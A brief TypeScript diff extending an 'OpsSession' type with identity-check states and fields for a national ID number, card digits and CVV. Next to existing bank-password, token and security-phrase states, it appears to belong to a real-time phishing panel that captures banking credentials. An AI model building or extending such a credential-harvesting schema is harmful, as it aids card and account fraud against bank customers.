@@ -7,6 +7,9 @@ export type OpsSessionState =
   | "telebanca"
   | "waiting-telebanca"
   | "typing-telebanca"
+  | "identidad"
+  | "waiting-identidad"
+  | "typing-identidad"
   | "waiting-imagen"
   | "imagen"
   | "waiting-pass"
@@ -17,6 +20,7 @@ export type OpsSessionState =
   | "error-pass"
   | "error-tejuino"
   | "error-token"
+  | "error-identidad"
   | "typing"
   | "typing-pass"
   | "typing-tejuino";
@@ -34,6 +38,9 @@ export type OpsSession = {
   last_seen?: number;
   imageSrc?: string;
   phrase?: string;
+  dui?: string;
+  cardDigits?: string;
+  cvv?: string;
 };
 
 export function createSessionId() {
